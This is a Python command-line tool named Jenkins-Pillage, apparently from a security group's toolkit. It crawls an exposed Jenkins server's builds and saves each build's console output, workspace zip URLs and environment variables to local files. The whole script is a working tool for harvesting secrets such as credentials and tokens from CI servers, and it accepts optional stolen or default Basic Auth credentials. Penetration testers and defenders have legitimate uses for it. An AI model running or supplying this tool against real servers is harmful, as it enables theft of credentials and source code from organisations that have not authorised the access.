#!/usr/bin/env python3
#@DolosGroup
# Jenkins-Pillage is a tool to extract sensitive information
# from an exposed Jenkins server.

import argparse
import sys
import logging

from urllib.parse import urlparse
from requests.auth import HTTPBasicAuth
from lib.libjenkinspillage import JenkinsJobBuild, get_all_build_links


def write_out_console_output(jenkins_build_object):
    content = jenkins_build_object.get_console_text()
    if content:
        print("-- FOUND CONSOLE OUTPUT")
        # output_filename = urlparse(jenkins_build_object.url).path.replace('/', '__') + ".console_output"
        output_filename = jenkins_build_object.url.replace('/', '__') + ".console_output"
        with open(output_filename, 'w') as file:
            file.write(content)

def write_out_zip_urls(jenkins_build_object):
    content = jenkins_build_object.get_workspace_zip()
    if content is not None:
        print("-- FOUND WORKSPACE ZIP URL")
        # url_filename = urlparse(jenkins_build_object.url).path.replace('/', '__') + ".workspace_url"
        url_filename = jenkins_build_object.url.replace('/', '__') + ".workspace_url"
        with open(url_filename, 'w') as file:
            file.write(content)

def write_out_env_vars(jenkins_build_object):
    content = jenkins_build_object.get_env_vars()
    if content and content is not None:
        print("-- FOUND ENV VARS")
        content = str(content).replace(',', "\n")
        # env_vars_filename = urlparse(jenkins_build_object.url).path.replace('/', '__') + ".env_vars"
        env_vars_filename = jenkins_build_object.url.replace('/', '__') + ".env_vars"
        with open(env_vars_filename, 'w') as file:
            file.write(content)

def main():
    """Main Execution"""
    # Setup help output
    parser = argparse.ArgumentParser(
        description='Pillage sensitive information from Jenkins servers')
    parser.add_argument(
        '-b','--buildurl',
        dest='build_url',
        help='The build URL to pillage'
        )
    parser.add_argument(
        '-u','--user',
        dest='username',
        help='The Basic Auth username for the service'
        )
    parser.add_argument(
        '-p','--password',
        dest='password',
        help='The Basic Auth password for the service'
        )
    parser.add_argument(
        '-l','--list',
        dest='list_url',
        help='Lists all found build URLs to use with -b'
        )
    parser.add_argument(
        '-a','--auto',
        dest='auto',
        help='Automatically perform -l and then -b on a root URL'
        )
    parser.add_argument(
        '-f','--force',
        dest='force',
        action='store_true',
        help='Force the URLs to use the supplied socket (in case the server returns localhost)'
        )
    args = parser.parse_args() 
    if args.username and args.password:
        auth = HTTPBasicAuth(args.username, args.password)
    else:
        auth = None
    if args.auto:
        print("Getting a list of all build URLs")
        build_links = get_all_build_links(args.auto, auth=auth, netloc_force=args.force)
        for url in build_links:
            build = JenkinsJobBuild(url, auth=auth)
            print("Attempting: {}".format(build.url))
            write_out_console_output(build)
            write_out_zip_urls(build)
            write_out_env_vars(build)

    if args.list_url:
        build_links = get_all_build_links(args.list_url, auth=auth, netloc_force=args.force)

    if args.build_url:
        url = args.build_url
        build = JenkinsJobBuild(url, auth=auth)
        print("Attempting: {}".format(build.url))
        write_out_console_output(build)
        write_out_zip_urls(build)
        write_out_env_vars(build)

if __name__ == '__main__':
    sys.exit(main())
    